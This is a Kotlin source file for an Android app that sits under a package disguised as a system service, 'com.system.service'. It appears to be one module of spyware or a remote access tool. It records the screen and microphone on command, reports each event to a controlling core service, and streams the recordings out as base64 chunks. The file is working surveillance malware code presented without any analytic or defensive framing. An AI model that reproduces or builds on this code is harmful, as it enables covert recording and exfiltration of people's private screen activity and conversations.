package com.system.service.monitors

import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import com.system.service.core.CoreService
import com.system.service.setup.MediaProjectionActivity
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object ScreenRecorder {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var currentFile: File? = null
    private var isRecording = false
    private var stopTimer: Timer? = null

    var pendingDuration = 60

    fun isRecording() = isRecording

    fun onProjectionResult(context: Context, resultCode: Int, data: Intent) {
        val pm  = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = pm.getMediaProjection(resultCode, data)
        startRecordingInternal(context)
    }

    fun start(context: Context, durationSeconds: Int = 60) {
        if (isRecording) return
        pendingDuration = durationSeconds
        if (mediaProjection == null) {
            val i = Intent(context, MediaProjectionActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            try { context.startActivity(i) } catch (_: Exception) {}
        } else {
            startRecordingInternal(context)
        }
    }

    private fun startRecordingInternal(context: Context) {
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        // BUG #14 FIX: Use WindowMetrics on API 30+ — avoids wrong dims on foldables
        val (sw, sh, dpi) = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            val bounds = wm.currentWindowMetrics.bounds
            Triple(bounds.width(), bounds.height(), context.resources.displayMetrics.densityDpi)
        } else {
            val m = android.util.DisplayMetrics()
            @Suppress("DEPRECATION") wm.defaultDisplay.getMetrics(m)
            Triple(m.widthPixels, m.heightPixels, m.densityDpi)
        }
        val dir = File(context.getExternalFilesDir(null), "recordings/screen").also { it.mkdirs() }
        val ts  = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val outFile = File(dir, "screen_${ts}.mp4")
        currentFile = outFile

        try {
            val mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(context)
                     else @Suppress("DEPRECATION") MediaRecorder()
            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
            mr.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mr.setOutputFile(outFile.absolutePath)
            mr.setVideoSize(sw, sh)
            mr.setVideoEncodingBitRate(3_000_000)
            mr.setVideoFrameRate(24)
            mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            mr.prepare()
            mediaRecorder = mr

            val proj = mediaProjection ?: run {
                CoreService.instance?.sendData("screen_record_error",
                    JSONObject().apply { put("error", "no_projection") }); return
            }

            virtualDisplay = proj.createVirtualDisplay(
                "ScreenRecorder", sw, sh, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mr.surface, null, null
            )
            mr.start()
            isRecording = true
            CoreService.instance?.sendData("screen_record_started", JSONObject().apply {
                put("filename", outFile.name)
                put("duration_seconds", pendingDuration)
            })
            if (pendingDuration > 0) {
                stopTimer = Timer()
                stopTimer!!.schedule(object : TimerTask() {
                    override fun run() { stop(context) }
                }, pendingDuration * 1000L)
            }
        } catch (e: Exception) {
            CoreService.instance?.sendData("screen_record_error",
                JSONObject().apply { put("error", e.message ?: "unknown") })
        }
    }

    fun stop(context: Context) {
        stopTimer?.cancel(); stopTimer = null
        try { mediaRecorder?.stop(); mediaRecorder?.reset(); mediaRecorder?.release() } catch (_: Exception) {}
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaRecorder = null; virtualDisplay = null; mediaProjection = null
        isRecording = false
        val file = currentFile
        if (file != null && file.exists()) {
            CoreService.instance?.sendData("screen_record_done", JSONObject().apply {
                put("filename", file.name)
                put("path", file.absolutePath)
                put("size_kb", file.length() / 1024)
            })
        }
        currentFile = null
    }

    fun listRecordings(context: Context): List<File> {
        val dir = File(context.getExternalFilesDir(null), "recordings/screen")
        return dir.listFiles()?.filter { it.name.endsWith(".mp4") }
            ?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    fun sendRecordingFile(context: Context, path: String) {
        val file = File(path)
        if (!file.exists()) {
            CoreService.instance?.sendData("screen_record_file_error",
                JSONObject().apply { put("error", "file_not_found") }); return
        }
        Thread {
            try {
                // BUG #5 FIX: Stream file chunks instead of readBytes() — prevents OOM on 50-100MB recordings
                  val chunkBytes  = 45 * 1024
                  val fileSize    = file.length()
                  val totalChunks = ((fileSize + chunkBytes - 1) / chunkBytes).toInt()
                  var chunkIdx    = 0
                  file.inputStream().buffered(chunkBytes).use { stream ->
                      val buf = ByteArray(chunkBytes); var read: Int
                      while (stream.read(buf).also { read = it } != -1) {
                          CoreService.instance?.sendData("screen_record_chunk", JSONObject().apply {
                              put("filename", file.name); put("chunk", chunkIdx); put("total", totalChunks)
                              put("data", Base64.encodeToString(buf.copyOf(read), Base64.NO_WRAP))
                          })
                          chunkIdx++; Thread.sleep(50)
                      }
                  }
            } catch (ex: Exception) {
                CoreService.instance?.sendData("screen_record_file_error",
                    JSONObject().apply { put("error", ex.message ?: "read_error") })
            }
        }.start()
    }
}
